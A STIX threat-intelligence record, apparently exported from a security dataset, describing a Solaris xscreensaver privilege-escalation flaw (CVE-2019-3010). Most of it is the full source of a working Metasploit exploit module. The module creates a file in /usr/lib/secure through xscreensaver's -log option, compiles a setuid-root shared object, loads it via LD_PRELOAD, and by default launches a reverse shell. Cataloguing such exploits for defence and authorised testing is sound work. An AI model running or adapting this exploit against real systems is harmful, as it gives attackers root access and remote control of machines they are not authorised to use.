{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84859d7c-f3d0-429b-a84e-e69d3f4b6bbc",
    "created": "2024-08-14T16:34:01.488798Z",
    "modified": "2024-08-14T16:34:01.488803Z",
    "name": "Solaris xscreensaver log Privilege Escalation",
    "description": " This module exploits a vulnerability in `xscreensaver` versions since 5.06 on unpatched Solaris 11 systems which allows users to gain root privileges.  `xscreensaver` allows users to create a user-owned file at any location on the filesystem using the `-log` command line argument introduced in version 5.06.  This module uses `xscreensaver` to create a log file in `/usr/lib/secure/` overwrites the log file with a shared object, and executes the shared object using the `LD_PRELOAD` environment variable.  This module has been tested successfully on:  xscreensaver version 5.15 on Solaris 11.1 (x86); and xscreensaver version 5.15 on Solaris 11.3 (x86).  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/local/xscreensaver_log_priv_esc.rb",
            "external_id": "xscreensaver_log_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Oct/39"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/0xdea/exploits/blob/master/solaris/raptor_xscreensaver"
        },
        {
            "source_name": "reference",
            "url": "https://techblog.mediaservice.net/2019/10/local-privilege-escalation-on-solaris-11-x-via-xscreensaver/"
        },
        {
            "source_name": "reference",
            "url": "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Solaris::Priv\n  include Msf::Post::Solaris::System\n  include Msf::Post::Solaris::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris xscreensaver log Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in `xscreensaver` versions\n        since 5.06 on unpatched Solaris 11 systems which allows users\n        to gain root privileges.\n\n        `xscreensaver` allows users to create a user-owned file at any\n        location on the filesystem using the `-log` command line argument\n        introduced in version 5.06.\n\n        This module uses `xscreensaver` to create a log file in `/usr/lib/secure/`,\n        overwrites the log file with a shared object, and executes the shared\n        object using the `LD_PRELOAD` environment variable.\n\n        This module has been tested successfully on:\n\n        xscreensaver version 5.15 on Solaris 11.1 (x86); and\n        xscreensaver version 5.15 on Solaris 11.3 (x86).\n      },\n      'References'     =>\n        [\n          ['CVE', '2019-3010'],\n          ['EDB', '47509'],\n          ['URL', 'https://seclists.org/fulldisclosure/2019/Oct/39'],\n          ['URL', 'https://github.com/0xdea/exploits/blob/master/solaris/raptor_xscreensaver'],\n          ['URL', 'https://techblog.mediaservice.net/2019/10/local-privilege-escalation-on-solaris-11-x-via-xscreensaver/'],\n          ['URL', 'https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html']\n        ],\n      'Notes'          => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'AKA' => ['raptor_xscreensaver'] },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Marco Ivaldi', # Discovery and exploit\n          'bcoles'        # Metasploit\n        ],\n      'DisclosureDate' => '2019-10-16',\n      'Privileged'     => true,\n      'Platform'       => ['solaris', 'unix'],\n      'Arch'           => [ARCH_CMD],\n      'Targets'        => [['Auto', {}]],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultOptions' =>\n        {\n          'PAYLOAD'     => 'cmd/unix/reverse_ksh',\n          'WfsDelay'    => 10,\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptString.new('XSCREENSAVER_PATH', [true, 'Path to xscreensaver executable', '/usr/bin/xscreensaver']),\n      OptString.new('XORG_PATH', [true, 'Path to Xorg executable', '/usr/bin/Xorg'])\n    ]\n    register_advanced_options [\n      OptString.new('Xdisplay', [true, 'Display to use if starting a new Xorg session', ':1']),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def xscreensaver_path\n    datastore['XSCREENSAVER_PATH']\n  end\n\n  def xorg_path\n    datastore['XORG_PATH']\n  end\n\n  def mkdir(path)\n    vprint_status \"Creating directory '#{path}'\"\n    cmd_exec \"mkdir -p '#{path}'\"\n    register_dir_for_cleanup path\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n\n    output = cmd_exec \"PATH=\\\"$PATH:/usr/sfw/bin/:/opt/sfw/bin/:/opt/csw/bin\\\" gcc -fPIC -shared -s -g -O2 -lc -o #{path} #{path}.c\"\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    register_file_for_cleanup path\n  end\n\n  def check\n    unless setuid? xscreensaver_path\n      vprint_error \"#{xscreensaver_path} is not setuid\"\n      return CheckCode::Safe\n    end\n    vprint_good \"#{xscreensaver_path} is setuid\"\n\n    unless has_gcc?\n      vprint_error 'gcc is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'gcc is installed'\n\n    xscreensaver_version = cmd_exec(\"#{xscreensaver_path} --help\").to_s.scan(/^xscreensaver ([\\d\\.]+)/).flatten.first\n    if xscreensaver_version.to_s.eql? ''\n      vprint_error 'Could not determine xscreensaver version'\n      return CheckCode::Detected\n    end\n\n    # Bug introduced in version 5.06. Patched in version <~ 5.42.\n    unless Rex::Version.new(xscreensaver_version).between?(Rex::Version.new('5.06'), Rex::Version.new('5.41'))\n      vprint_error \"xscreensaver version #{xscreensaver_version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"xscreensaver version #{xscreensaver_version} appears to be vulnerable\"\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    # Set display\n    display = cmd_exec 'echo $DISPLAY'\n    kill_xorg = false\n\n    if display.to_s.blank?\n      display = datastore['Xdisplay']\n      print_status \"Starting Xorg on display #{display} ...\"\n      cmd_exec \"#{xorg_path} #{display} & echo \"\n      kill_xorg = true\n    else\n      print_status \"Using Xorg display #{display} ...\"\n    end\n\n    # Create writable log file in /usr/lib/secure/\n    lib_name = rand_text_alphanumeric 5..10\n    if cmd_exec(\"/usr/bin/file #{xscreensaver_path}\").to_s.include? 'ELF 64-bit'\n      secure_path = \"/usr/lib/secure/64/\"\n    else\n      secure_path = \"/usr/lib/secure/\"\n    end\n    lib_path = \"#{secure_path}#{lib_name}.so\"\n\n    print_status \"Creating log file #{lib_path} ...\"\n    cmd_exec \"umask 0; DISPLAY=#{display} #{xscreensaver_path} -display #{display} -log #{lib_path} & echo \"\n\n    Rex.sleep(5)\n\n    cmd_exec 'pkill -U `whoami` -n xscreensaver'\n    if kill_xorg\n      cmd_exec 'pkill -U `whoami` -n Xorg'\n    end\n\n    unless writable? lib_path\n      fail_with Failure::NotVulnerable, \"Could not create writable log file #{lib_path}\"\n    end\n\n    register_file_for_cleanup lib_path\n\n    # Upload and compile shared object\n    base_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}\"\n    mkdir base_path\n\n    payload_name = \".#{rand_text_alphanumeric 5..10}\"\n    payload_path = \"#{base_path}/#{payload_name}\"\n\n    so = <<-EOF\n      #include <unistd.h>\n      void __attribute__((constructor)) cons() {\n        setuid(0);\n        setgid(0);\n        unlink(\"#{lib_path}\");\n        execle(\"#{payload_path}\", \"\", NULL, NULL);\n        _exit(0);\n      }\n    EOF\n\n    so_name = \".#{rand_text_alphanumeric 5..10}\"\n    so_path = \"#{base_path}/#{so_name}\"\n    upload_and_compile so_path, so\n\n    # Overwrite newly created log file with compiled shared object\n    vprint_status \"Writing shared object to #{lib_path}\"\n    cmd_exec \"cp '#{so_path}' '#{lib_path}'\"\n\n    # Upload and execute payload\n    if payload.arch.first.to_s == 'cmd'\n      upload payload_path, \"#!/bin/sh\\n#{payload.encoded}\"\n    else\n      upload payload_path, generate_payload_exe\n    end\n    chmod payload_path\n\n    print_status 'Executing payload...'\n    cmd_exec \"LD_PRELOAD=#{lib_path} #{xscreensaver_path} --help & echo \"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-10-16",
    "x_mitre_platforms": [
        "['solaris', 'unix']"
    ]
}